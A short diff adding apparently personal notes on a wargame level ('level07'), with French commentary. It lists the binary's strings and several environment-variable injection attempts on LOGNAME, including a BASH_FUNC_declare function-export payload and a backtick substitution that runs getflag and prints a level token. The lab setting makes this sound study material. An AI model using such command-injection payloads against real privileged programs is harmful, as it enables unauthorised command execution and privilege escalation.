@@ -1,0 +1,16 @@
+Strings level07
+LOGNAME
+/bin/echo %s 
+;*2$"
+
+LOGNAME=base;getflag;
+	there is no flag
+
+LOGNAME=() { getflag; }
+
+From https://www.elttam.com/blog/env/#content
+BASH_FUNC_declare%%=() { id; exit; }
+
+Comme pour l’exercice précédent, on peut appeller une fonction Shell 
+LOGNAME='{`getflag`}'
+	{Check flag.Here is your token : fiumuikeil55xe9cu4dood66h}
